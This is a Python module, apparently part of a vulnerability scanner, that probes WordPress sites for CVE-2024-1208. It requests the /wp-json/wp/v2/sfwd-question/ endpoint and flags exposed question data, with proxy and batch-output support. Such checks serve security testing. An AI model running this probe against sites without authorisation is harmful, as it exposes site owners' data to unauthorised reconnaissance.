#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_1208:
    def get_url(self,input_url):
        try:
            url = input_url + "/wp-json/wp/v2/sfwd-question/"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "date_gmt" in req.text and req.status_code == 200:
                OutPrintInfoSuc("WordPress", f'目标存在CVE-2024-1208敏感信息泄露漏洞: {url}')
                if self.batch:
                    OutPutFile("wordpress_2024_1208.txt",f'目标存在CVE-2024-1208敏感信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在CVE-2024-1208敏感信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("WordPress",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测CVE-2024-1208敏感信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'CVE-2024-1208敏感信息泄露漏洞检测结束')



